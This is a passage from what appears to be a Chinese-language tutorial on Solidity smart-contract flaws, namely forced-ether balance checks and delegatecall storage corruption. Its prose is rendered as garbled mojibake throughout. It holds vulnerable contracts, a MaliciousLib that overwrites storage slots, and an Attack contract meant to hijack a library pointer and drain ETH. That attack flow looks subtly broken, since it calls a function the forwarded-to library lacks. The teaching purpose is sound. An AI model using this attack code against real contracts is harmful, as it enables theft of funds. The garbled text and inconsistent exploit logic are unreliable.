<h1 id="æ„å¤–ä¹‹è´¢"><a href="#æ„å¤–ä¹‹è´¢" class="headerlink" title="æ„å¤–ä¹‹è´¢"></a>æ„å¤–ä¹‹è´¢</h1><p>ä¾èµ–åˆçº¦å…¨å±€ä½™é¢åšä¸ºä¸šåŠ¡æ¡ä»¶ä¼šäº§ç”Ÿâ€œæ„å¤–ä¹‹è´¢â€é£é™©ï¼Œå› ä¸ºåˆçº¦ä½™é¢å¯è¢«å¤–éƒ¨åŠ›é‡ä¿®æ”¹è€Œä¸è§¦å‘åˆçº¦ä»£ç ã€‚ç¨³å¥çš„åšæ³•æ˜¯ä½¿ç”¨<strong>å†…éƒ¨ä¼šè®¡&#x2F;å‡­è¯</strong>å’Œæ›´ä¸¥æ ¼çš„èµ„æ ¼æ£€æŸ¥ï¼Œé¿å…å°†å…³é”®æƒé™æˆ–å¥–åŠ±ç›´æ¥ç»‘å®šåˆ° <code>address(this).balance</code>ã€‚</p>
<h3 id="1-åˆçº¦ç¤ºä¾‹"><a href="#1-åˆçº¦ç¤ºä¾‹" class="headerlink" title="1. åˆçº¦ç¤ºä¾‹"></a>1. åˆçº¦ç¤ºä¾‹</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract EtherGame &#123;</span><br><span class="line">    uint256 public finalMilestone = 10 ether;</span><br><span class="line"></span><br><span class="line">    // ç©å®¶å­˜å…¥ä»¥å¤ªï¼Œç›®æ ‡æ˜¯è®©åˆçº¦ä½™é¢è¾¾åˆ° finalMilestone</span><br><span class="line">    function play() public payable &#123;</span><br><span class="line">        // æ³¨æ„ï¼šaddress(this).balance å·²ç»åŒ…å«äº†æœ¬æ¬¡ msg.valueï¼ˆåœ¨æ‰§è¡Œæ—¶ï¼‰</span><br><span class="line">        uint256 currentBalance = address(this).balance;</span><br><span class="line">        require(currentBalance &lt;= finalMilestone, &quot;exceeds milestone&quot;);</span><br><span class="line">        // å…¶ä»–é€»è¾‘ï¼ˆè®°å½•ç©å®¶è´¡çŒ®ç­‰ï¼‰...</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // ä»»ä½•äººéƒ½å¯è°ƒç”¨ï¼Œè‹¥åˆçº¦ä½™é¢æ­£å¥½ç­‰äº finalMilestone åˆ™å¥–åŠ±è¢«è®¤é¢†</span><br><span class="line">    function claimReward() public &#123;</span><br><span class="line">        require(address(this).balance == finalMilestone, &quot;milestone not reached&quot;);</span><br><span class="line">        // å‘æ”¾å¥–åŠ±ï¼ˆç¤ºä¾‹ï¼šæŠŠä½™é¢è½¬ç»™è°ƒç”¨è€…ï¼‰</span><br><span class="line">        payable(msg.sender).transfer(address(this).balance);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="2-é—®é¢˜ä¸é£é™©ï¼ˆä¸ºä»€ä¹ˆä¼šå‡ºç°â€œæ„å¤–ä¹‹è´¢â€ï¼‰"><a href="#2-é—®é¢˜ä¸é£é™©ï¼ˆä¸ºä»€ä¹ˆä¼šå‡ºç°â€œæ„å¤–ä¹‹è´¢â€ï¼‰" class="headerlink" title="2. é—®é¢˜ä¸é£é™©ï¼ˆä¸ºä»€ä¹ˆä¼šå‡ºç°â€œæ„å¤–ä¹‹è´¢â€ï¼‰"></a>2. é—®é¢˜ä¸é£é™©ï¼ˆä¸ºä»€ä¹ˆä¼šå‡ºç°â€œæ„å¤–ä¹‹è´¢â€ï¼‰</h3><ul>
<li>åˆçº¦é€»è¾‘<strong>ç›´æ¥ä¾èµ– <code>address(this).balance</code></strong> æ¥åˆ¤æ–­æ˜¯å¦åˆ°è¾¾ç›®æ ‡ï¼ˆ<code>finalMilestone</code>ï¼‰ã€‚</li>
<li><strong>åˆçº¦ä½™é¢å¯ä»¥åœ¨ä¸æ‰§è¡Œåˆçº¦ä»»æ„ä»£ç çš„æƒ…å†µä¸‹è¢«æ”¹å˜</strong>ï¼ˆä¾‹å¦‚ <code>selfdestruct</code>ã€çŸ¿å·¥å¥–åŠ±æˆ–ä»–äººäº‹å…ˆè½¬è´¦ï¼‰ï¼Œå¯¼è‡´ <code>claimReward</code> æ¡ä»¶è¢«æ„å¤–æ»¡è¶³ï¼Œä»»ä½•äººéƒ½èƒ½è°ƒç”¨é¢†å–å¥–åŠ±ï¼ˆåŒ…æ‹¬å¹¶éçœŸæ­£å‚ä¸æ¸¸æˆçš„åœ°å€ï¼‰ã€‚</li>
<li>å› ä¸º <code>address(this).balance</code> åœ¨è¿›å…¥å‡½æ•°æ—¶å·²ç»åŒ…å« <code>msg.value</code>ï¼Œæ‰€ä»¥åœ¨ <code>play()</code> ä¸­é”™è¯¯åœ°ç”¨ <code>address(this).balance + msg.value</code> æ¥åˆ¤æ–­ä¼šå¯¼è‡´é€»è¾‘æ··æ·†ï¼ˆä¸”é€šå¸¸æ˜¯é”™è¯¯çš„ï¼‰ã€‚</li>
</ul>
<hr>
<h3 id="3-ç¤ºä¾‹æ”»å‡»-è§¦å‘åœºæ™¯"><a href="#3-ç¤ºä¾‹æ”»å‡»-è§¦å‘åœºæ™¯" class="headerlink" title="3. ç¤ºä¾‹æ”»å‡»&#x2F;è§¦å‘åœºæ™¯"></a>3. ç¤ºä¾‹æ”»å‡»&#x2F;è§¦å‘åœºæ™¯</h3><ol>
<li>æ”»å‡»è€…æˆ–ç¬¬ä¸‰æ–¹å¯¹åˆçº¦æ‰§è¡Œ <code>selfdestruct(targetContract)</code>ï¼ŒæŠŠä¸€å®šæ•°é¢çš„ ETH å¼ºåˆ¶å‘é€åˆ°è¯¥åˆçº¦ï¼Œä½¿ <code>address(this).balance</code> æ°å¥½ç­‰äº <code>finalMilestone</code>ã€‚</li>
<li>ä»»ä½•åœ°å€éšåè°ƒç”¨ <code>claimReward()</code>ï¼Œå› ä¸º <code>address(this).balance == finalMilestone</code> ä¸ºçœŸï¼Œåˆçº¦æŠŠä½™é¢è½¬ç»™è°ƒç”¨è€… â€”â€” <strong>åŸæœ¬æœªå‚ä¸å‡ºèµ„çš„äººå¯ç›´æ¥é¢†å–</strong>ã€‚</li>
</ol>
<hr>
<h3 id="4-ä¸‰ç§ä¸ä¼šè§¦å‘-EVM-åˆçº¦ä»£ç æ‰§è¡Œä½†ä¼šå½±å“åˆçº¦ä½™é¢çš„é€”å¾„"><a href="#4-ä¸‰ç§ä¸ä¼šè§¦å‘-EVM-åˆçº¦ä»£ç æ‰§è¡Œä½†ä¼šå½±å“åˆçº¦ä½™é¢çš„é€”å¾„" class="headerlink" title="4. ä¸‰ç§ä¸ä¼šè§¦å‘ EVM åˆçº¦ä»£ç æ‰§è¡Œä½†ä¼šå½±å“åˆçº¦ä½™é¢çš„é€”å¾„"></a>4. ä¸‰ç§ä¸ä¼šè§¦å‘ EVM åˆçº¦ä»£ç æ‰§è¡Œä½†ä¼šå½±å“åˆçº¦ä½™é¢çš„é€”å¾„</h3><ul>
<li><strong>Mining reward</strong>ï¼šçŸ¿å·¥&#x2F;åŒºå—å¥–åŠ±ï¼ˆæˆ–å†…ç½®å¥–åŠ±ï¼‰åˆ†é…åˆ°æŸäº›åœ°å€ï¼Œä¼šå½±å“é“¾ä¸Šè´¦æˆ·ä½™é¢ï¼Œä½†ä¸è§¦å‘ç›®æ ‡åˆçº¦çš„ä»£ç ã€‚</li>
<li>**selfdestruct(target)**ï¼š<code>selfdestruct</code> æŠŠä»¥å¤ªç›´æ¥å†™å…¥ç›®æ ‡åˆçº¦çš„ä½™é¢ï¼Œä¸ä¼šè°ƒç”¨ç›®æ ‡åˆçº¦çš„ <code>receive</code>&#x2F;<code>fallback</code>ï¼Œå› æ­¤ä¸ä¼šè§¦å‘åˆçº¦é€»è¾‘ã€‚</li>
<li><strong>Pre-sent Etherï¼ˆäº‹å…ˆè½¬è´¦ï¼‰</strong>ï¼šä»»ä½•åœ°å€ç›´æ¥å‘åˆçº¦è½¬è´¦ï¼ˆ<code>send</code>&#x2F;<code>transfer</code>&#x2F;<code>call</code>ï¼‰ï¼Œæˆ–è€…éƒ¨ç½²æ—¶å³æœ‰åˆå§‹ä½™é¢ï¼Œè¿™äº›éƒ½å¯èƒ½æ”¹å˜åˆçº¦ä½™é¢è€Œæ— é¡»è¢«ç›®æ ‡åˆçº¦çš„ä¸šåŠ¡é€»è¾‘å¤„ç†ã€‚</li>
</ul>
<hr>
<h3 id="5-é˜²å¾¡ä¸æœ€ä½³å®è·µ"><a href="#5-é˜²å¾¡ä¸æœ€ä½³å®è·µ" class="headerlink" title="5. é˜²å¾¡ä¸æœ€ä½³å®è·µ"></a>5. é˜²å¾¡ä¸æœ€ä½³å®è·µ</h3><ul>
<li>**ä¸è¦æŠŠå…³é”®ä¸šåŠ¡é€»è¾‘ç›´æ¥ä¾èµ– <code>address(this).balance</code>**ï¼ˆå°¤å…¶æ˜¯å†³å®šè°å¯é¢†å–èµ„äº§çš„é€»è¾‘ï¼‰ã€‚</li>
<li><strong>å¼•å…¥å†…éƒ¨è´¦æœ¬ï¼ˆå†…éƒ¨è®°è´¦ï¼‰</strong>ï¼šå¯¹æ¯ä¸ªå‚ä¸è€…ç»´æŠ¤ <code>mapping(address =&gt; uint256) deposits</code>ï¼Œå¹¶åŸºäºå†…éƒ¨è®°è´¦åˆ¤æ–­èµ„æ ¼ä¸åˆ†é…å¥–åŠ±ï¼Œè€Œéå…¨å±€åˆçº¦ä½™é¢ã€‚</li>
<li><strong>å¯¹é¢†å¥–é€»è¾‘å¢åŠ èµ„æ ¼æ ¡éªŒ</strong>ï¼šä¾‹å¦‚åªæœ‰å®é™…æœ‰è´¡çŒ®ï¼ˆ<code>deposits[msg.sender] &gt; 0</code>ï¼‰æˆ–åœ¨ç™½åå•å†…çš„å‚ä¸è€…æ‰å¯ <code>claimReward</code>ã€‚</li>
<li><strong>ä½¿ç”¨ Pull payments æ¨¡å¼</strong>ï¼šè®°å½•åº”å¾—é‡‘é¢ï¼Œå—ç›Šäººä¸»åŠ¨æå–ï¼ˆ<code>withdraw</code>ï¼‰ï¼Œé¿å…ä¸€æ¬¡æ€§æŠŠåˆçº¦å…¨é¢å‘å‡ºç»™ä»»æ„è°ƒç”¨è€…ã€‚</li>
<li><strong>å¯¹ä¸å¯é¢„è§åˆ°çš„å¼ºåˆ¶è½¬è´¦ä¿æŒé˜²å¾¡æ€§è®¾è®¡</strong>ï¼šå‡å®š <code>address(this).balance</code> å¯èƒ½éšæ—¶è¢«å¤–éƒ¨å¼ºåˆ¶æ”¹å˜ï¼Œä¸šåŠ¡é€»è¾‘åº”èƒ½å®¹å¿æˆ–æ£€æµ‹è¿™ç§æƒ…å†µï¼ˆä¾‹å¦‚ä¸æ ¹æ®å…¨å±€ä½™é¢åšå…³é”®åˆ¤æ–­ï¼‰ã€‚</li>
<li><strong>æ—¥å¿—ä¸ç›‘æ§</strong>ï¼šå¯¹å…³é”®çŠ¶æ€ï¼ˆå¦‚è¾¾åˆ°é‡Œç¨‹ç¢‘ï¼‰åšå®¡è®¡æ—¥å¿—ä¸é“¾ä¸Šå‘Šè­¦ï¼Œä¾¿äºäººå·¥åˆ¤æ–­æ˜¯å¦ä¸ºå¼‚å¸¸è§¦å‘ã€‚</li>
</ul>
<h1 id="Delegatecall"><a href="#Delegatecall" class="headerlink" title="Delegatecall"></a>Delegatecall</h1><p><strong>ä¸»è¦å¯¼è‡´å­˜å‚¨æ±¡æŸ“</strong></p>
<p><strong>å­˜å‚¨æ±¡æŸ“</strong>æŒ‡ï¼šä¸€ä¸ªåˆçº¦çš„çŠ¶æ€å˜é‡ï¼ˆstorage slotï¼‰è¢«æ„å¤–æˆ–æ¶æ„ä¿®æ”¹ï¼Œå¯¼è‡´åˆçº¦é€»è¾‘å¼‚å¸¸æˆ–å…³é”®æ•°æ®è¢«ç¯¡æ”¹ã€‚</p>
<p><strong>å…¸å‹åœºæ™¯</strong>ï¼šä½¿ç”¨ <code>delegatecall</code> è°ƒç”¨å¤–éƒ¨åº“åˆçº¦æ—¶ï¼Œè¢«è°ƒç”¨åˆçº¦çš„ä»£ç åœ¨è°ƒç”¨åˆçº¦ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œï¼Œä»»ä½•å¯¹ <code>storage</code> çš„å†™å…¥éƒ½ä¼šå½±å“è°ƒç”¨åˆçº¦è‡ªèº«çš„çŠ¶æ€ã€‚</p>
<h2 id="1-Vulnerable-FibonacciBalanceï¼ˆå­˜åœ¨-delegatecall-å¯¼è‡´çš„å­˜å‚¨æ±¡æŸ“é—®é¢˜ï¼‰"><a href="#1-Vulnerable-FibonacciBalanceï¼ˆå­˜åœ¨-delegatecall-å¯¼è‡´çš„å­˜å‚¨æ±¡æŸ“é—®é¢˜ï¼‰" class="headerlink" title="1. Vulnerable: FibonacciBalanceï¼ˆå­˜åœ¨ delegatecall å¯¼è‡´çš„å­˜å‚¨æ±¡æŸ“é—®é¢˜ï¼‰"></a>1. Vulnerable: <code>FibonacciBalance</code>ï¼ˆå­˜åœ¨ <code>delegatecall</code> å¯¼è‡´çš„å­˜å‚¨æ±¡æŸ“é—®é¢˜ï¼‰</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract FibonacciBalance &#123;</span><br><span class="line">    // storage layout (slots)</span><br><span class="line">    address public fibonacciLibrary;      // slot 0</span><br><span class="line">    uint256 public calculatedFibNumber;   // slot 1</span><br><span class="line">    uint256 public start = 3;             // slot 2</span><br><span class="line">    uint256 public withdrawalCounter;     // slot 3</span><br><span class="line"></span><br><span class="line">    bytes4 constant fbSig = bytes4(keccak256(&quot;setFibonacci(uint256)&quot;));</span><br><span class="line"></span><br><span class="line">    constructor(address _fibonacciLibrary) payable &#123;</span><br><span class="line">        fibonacciLibrary = _fibonacciLibrary;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // æ¯æ¬¡ withdraw ä¼šå…ˆå¢åŠ  counterï¼Œç„¶åé€šè¿‡ delegatecall è°ƒç”¨ library çš„ setFibonacci</span><br><span class="line">    function withdraw() public &#123;</span><br><span class="line">        withdrawalCounter += 1;</span><br><span class="line">        (bool ok, ) = fibonacciLibrary.delegatecall(abi.encodeWithSelector(fbSig, withdrawalCounter));</span><br><span class="line">        require(ok, &quot;delegatecall failed&quot;);</span><br><span class="line"></span><br><span class="line">        // æŒ‰è®¡ç®—çš„ Fib å€¼å‘ ETHï¼ˆç®€åŒ–ç¤ºä¾‹ï¼‰</span><br><span class="line">        payable(msg.sender).transfer(calculatedFibNumber * 1 ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // å°†ä»»æ„ calldata è½¬å‘ç»™ libraryï¼ˆå±é™©ï¼šä»»ä½•å¤–éƒ¨è¾“å…¥éƒ½ä¼šä»¥ delegatecall åœ¨æœ¬åˆçº¦ä¸Šä¸‹æ–‡æ‰§è¡Œï¼‰</span><br><span class="line">    fallback() external payable &#123;</span><br><span class="line">        (bool ok, ) = fibonacciLibrary.delegatecall(msg.data);</span><br><span class="line">        require(ok, &quot;fallback delegatecall failed&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="2-Intended-library-FibonacciLibï¼ˆæ­£å¸¸å®ç°ï¼ŒæŒ‰è‡ªèº«-storage-å¸ƒå±€å†™å…¥ï¼‰"><a href="#2-Intended-library-FibonacciLibï¼ˆæ­£å¸¸å®ç°ï¼ŒæŒ‰è‡ªèº«-storage-å¸ƒå±€å†™å…¥ï¼‰" class="headerlink" title="2. Intended library: FibonacciLibï¼ˆæ­£å¸¸å®ç°ï¼ŒæŒ‰è‡ªèº« storage å¸ƒå±€å†™å…¥ï¼‰"></a>2. Intended library: <code>FibonacciLib</code>ï¼ˆæ­£å¸¸å®ç°ï¼ŒæŒ‰è‡ªèº« storage å¸ƒå±€å†™å…¥ï¼‰</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract FibonacciLib &#123;</span><br><span class="line">    // library è‡ªå·±çš„ storage å¸ƒå±€ï¼ˆåœ¨ delegatecall æ—¶ä¼šæ˜ å°„åˆ°è°ƒç”¨è€…åˆçº¦çš„ storageï¼‰</span><br><span class="line">    uint256 public start;                 // slot 0 (when used via delegatecall it maps to caller.slot0)</span><br><span class="line">    uint256 public calculatedFibNumber;   // slot 1</span><br><span class="line"></span><br><span class="line">    function setStart(uint256 _start) public &#123;</span><br><span class="line">        start = _start;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function setFibonacci(uint256 n) public &#123;</span><br><span class="line">        calculatedFibNumber = hbonacci(n);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function hbonacci(uint256 n) internal view returns (uint256) &#123;</span><br><span class="line">        if (n == 0) return start;</span><br><span class="line">        if (n == 1) return start + 1;</span><br><span class="line">        // ç®€åŒ–ï¼šé€’å½’å®ç°å¯èƒ½ä¼šè€— gasï¼Œæ­¤å¤„ä»…ç¤ºä¾‹</span><br><span class="line">        uint256 a = start;</span><br><span class="line">        uint256 b = start + 1;</span><br><span class="line">        for (uint256 i = 2; i &lt;= n; i++) &#123;</span><br><span class="line">            uint256 c = a + b;</span><br><span class="line">            a = b;</span><br><span class="line">            b = c;</span><br><span class="line">        &#125;</span><br><span class="line">        return b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="3-æ¶æ„åº“ï¼šMaliciousLibï¼ˆé€šè¿‡å†™å…¥ç‰¹å®š-storage-slot-æ¥ç¯¡æ”¹è°ƒç”¨è€…åˆçº¦çš„å…³é”®å˜é‡ï¼‰"><a href="#3-æ¶æ„åº“ï¼šMaliciousLibï¼ˆé€šè¿‡å†™å…¥ç‰¹å®š-storage-slot-æ¥ç¯¡æ”¹è°ƒç”¨è€…åˆçº¦çš„å…³é”®å˜é‡ï¼‰" class="headerlink" title="3. æ¶æ„åº“ï¼šMaliciousLibï¼ˆé€šè¿‡å†™å…¥ç‰¹å®š storage slot æ¥ç¯¡æ”¹è°ƒç”¨è€…åˆçº¦çš„å…³é”®å˜é‡ï¼‰"></a>3. æ¶æ„åº“ï¼š<code>MaliciousLib</code>ï¼ˆé€šè¿‡å†™å…¥ç‰¹å®š storage slot æ¥ç¯¡æ”¹è°ƒç”¨è€…åˆçº¦çš„å…³é”®å˜é‡ï¼‰</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract MaliciousLib &#123;</span><br><span class="line">    // æ³¨æ„ï¼šæ­¤åˆçº¦çš„ storage å¸ƒå±€ä¸ FibonacciBalance ä¸åŒï¼Œ</span><br><span class="line">    // å½“é€šè¿‡ delegatecall åœ¨ç›®æ ‡åˆçº¦ä¸Šä¸‹æ–‡æ‰§è¡Œæ—¶ï¼Œèµ‹å€¼ä¼šå†™åˆ°ç›®æ ‡åˆçº¦çš„ storage slotã€‚</span><br><span class="line">    // ä¾‹å¦‚ï¼šä¸‹é¢çš„å‡½æ•°æ•…æ„å†™å…¥ slot 0ï¼Œä½¿è°ƒç”¨è€…çš„ fibonacciLibrary è¢«æ›¿æ¢ä¸ºæ”»å‡»è€…æŒ‡å®šçš„åœ°å€ã€‚</span><br><span class="line"></span><br><span class="line">    // å°† slot 0 è¦†å†™ä¸ºä¼ å…¥çš„åœ°å€ï¼ˆé€šè¿‡ä½çº§å†™ storage å®ç°ï¼‰</span><br><span class="line">    function hijackLibrary(address newLib) public &#123;</span><br><span class="line">        // åœ¨ delegatecall ä¸Šä¸‹æ–‡ä¸­ï¼Œè¿™ä¼šå†™å…¥è°ƒç”¨è€…åˆçº¦çš„ slot 0</span><br><span class="line">        assembly &#123;</span><br><span class="line">            sstore(0, newLib)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // ä¹Ÿæä¾›ä¸€ä¸ª setFibonacci ç”¨äºç¤ºä¾‹ï¼šç›´æ¥è®¾ç½® slot 1ï¼ˆè°ƒç”¨è€…çš„ calculatedFibNumberï¼‰</span><br><span class="line">    function setFibonacci(uint256 v) public &#123;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            sstore(1, v)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="4-æ”»å‡»åˆçº¦ï¼ˆç¤ºä¾‹æ”»å‡»æµç¨‹ï¼‰"><a href="#4-æ”»å‡»åˆçº¦ï¼ˆç¤ºä¾‹æ”»å‡»æµç¨‹ï¼‰" class="headerlink" title="4. æ”»å‡»åˆçº¦ï¼ˆç¤ºä¾‹æ”»å‡»æµç¨‹ï¼‰"></a>4. æ”»å‡»åˆçº¦ï¼ˆç¤ºä¾‹æ”»å‡»æµç¨‹ï¼‰</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface IFibonacciBalance &#123;</span><br><span class="line">    function withdraw() external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line">    address public attacker;</span><br><span class="line">    address public maliciousLib;</span><br><span class="line"></span><br><span class="line">    constructor(address _maliciousLib) &#123;</span><br><span class="line">        attacker = msg.sender;</span><br><span class="line">        maliciousLib = _maliciousLib;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // æ­¥éª¤ç¤ºä¾‹ï¼š</span><br><span class="line">    // 1) å…ˆæŠŠç›®æ ‡åˆçº¦çš„ fibonacciLibrary æŒ‡å‘ maliciousLibï¼ˆé€šè¿‡è°ƒç”¨ fallback è½¬å‘ä¸€ä¸ªå¯¹ maliciousLib.hijackLibrary çš„ delegatecallï¼‰</span><br><span class="line">    // 2) å†è§¦å‘ withdrawï¼ŒmaliciousLib çš„ setFibonacci ä¼šæŠŠ calculatedFibNumber è®¾ç½®ä¸ºä»»æ„å¤§å€¼ï¼Œä»è€Œ withdraw æ—¶è½¬å‡ºå¤§é‡ ETHï¼ˆæ¼”ç¤ºï¼‰</span><br><span class="line">    function attackHijack(address target) external &#123;</span><br><span class="line">        // 1) æ„é€ è°ƒç”¨æ•°æ®ï¼šhijackLibrary(address)</span><br><span class="line">        bytes memory data = abi.encodeWithSignature(&quot;hijackLibrary(address)&quot;, maliciousLib);</span><br><span class="line">        // é€šè¿‡å‘ target å‘é€è¿™ç¬”äº¤æ˜“ï¼Œè®© target.fallback() æ‰§è¡Œ delegatecall(msg.data)</span><br><span class="line">        // åœ¨å®é™…ç¯å¢ƒä¸­ï¼Œç›´æ¥è°ƒç”¨ target çš„ fallback å³å¯ï¼ˆè¿™é‡Œç”¨ low-level call æ¨¡æ‹Ÿï¼‰</span><br><span class="line">        (bool ok, ) = target.call(data);</span><br><span class="line">        require(ok, &quot;hijack failed&quot;);</span><br><span class="line"></span><br><span class="line">        // 2) ç°åœ¨è°ƒç”¨ maliciousLib.setFibonacci(v) via target.withdraw() çš„æµç¨‹ï¼š</span><br><span class="line">        // æˆ‘ä»¬å…ˆæŠŠ maliciousLib çš„ setFibonacci ä¼šå†™å…¥ slot 1ï¼ˆcalculatedFibNumberï¼‰</span><br><span class="line">        // ç›´æ¥è§¦å‘ withdrawï¼ˆwithdraw ä¼š delegatecall setFibonacci with withdrawalCounter ä½œä¸ºå‚æ•°ï¼‰</span><br><span class="line">        IFibonacciBalance(target).withdraw();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="5-æ¼æ´è¦ç‚¹"><a href="#5-æ¼æ´è¦ç‚¹" class="headerlink" title="5. æ¼æ´è¦ç‚¹"></a>5. æ¼æ´è¦ç‚¹</h2><ul>
<li><code>delegatecall</code> ä¼šåœ¨è°ƒç”¨è€…ï¼ˆcallerï¼‰çš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œè¢«è°ƒåˆçº¦ï¼ˆlibraryï¼‰çš„ä»£ç ï¼š<strong>è¢«è°ƒåˆçº¦å¯¹ state çš„å†™å…¥ä¼šå½±å“è°ƒç”¨åˆçº¦çš„ storage slots</strong>ã€‚</li>
<li>è‹¥è°ƒç”¨åˆçº¦å…è®¸ä»»æ„ calldata è¢«è½¬å‘åˆ° <code>delegatecall</code>ï¼ˆå¦‚ <code>fallback()</code> ç›´æ¥ <code>delegatecall(msg.data)</code>ï¼‰ï¼Œæ”»å‡»è€…å¯ä»¥æ„é€  calldata æ¥æ‰§è¡Œæ¶æ„ library çš„æ–¹æ³•ï¼Œä»è€Œä¿®æ”¹è°ƒç”¨åˆçº¦çš„å…³é”® storageï¼ˆå¦‚ <code>fibonacciLibrary</code> æˆ– <code>calculatedFibNumber</code>ï¼‰ã€‚</li>
<li>ç”±äº storage slot çš„æ˜ å°„å…³ç³»ï¼Œ<strong>åº“åˆçº¦ä¸è°ƒç”¨åˆçº¦å¿…é¡»ä¸¥æ ¼å¯¹é½ storage å¸ƒå±€</strong>ï¼Œå¦åˆ™å°†å‡ºç°å­˜å‚¨æ±¡æŸ“æˆ–è¢«æ»¥ç”¨çš„é£é™©ã€‚</li>
</ul>
<hr>
<h2 id="6-ä¿®å¤å»ºè®®"><a href="#6-ä¿®å¤å»ºè®®" class="headerlink" title="6. ä¿®å¤å»ºè®®"></a>6. ä¿®å¤å»ºè®®</h2><ul>
<li><strong>ä¸è¦æŠŠä¸å—ä¿¡ä»»çš„åœ°å€è®¾ä¸ºå¯ delegatecall çš„ç›®æ ‡</strong>ï¼›å¦‚æœå¿…é¡»ä½¿ç”¨ libraryï¼Œç¡®ä¿å…¶æ¥æºå¯ä¿¡ä¸” storage å¸ƒå±€ä¸€è‡´ä¸”ä¸å¯æ›´æ”¹ã€‚</li>
